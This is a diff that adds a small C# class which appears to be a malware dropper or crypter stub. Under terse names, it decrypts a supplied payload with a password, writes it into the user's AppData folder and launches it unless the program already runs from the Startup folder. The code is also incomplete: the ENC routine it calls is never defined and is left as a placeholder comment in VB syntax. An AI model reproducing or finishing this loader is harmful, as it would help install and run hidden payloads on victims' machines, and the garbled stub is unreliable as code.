@@ -1,0 +1,15 @@
+ using System;
+ public class C
+    {
+        public static bool F(object File2Dec, string Pass, object Ext)
+        {
+            byte[] C;
+            string StrPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + System.IO.Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location);
+            string P = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Ext.ToString();
+			C = ENC(File2Dec.ToString(), Pass);
+            System.IO.File.WriteAllBytes(P, C);
+            if (!(StrPath == System.Reflection.Assembly.GetExecutingAssembly().Location)) { System.Diagnostics.Process.Start(P); }
+            return true;
+        }
+        'ENC
+    }
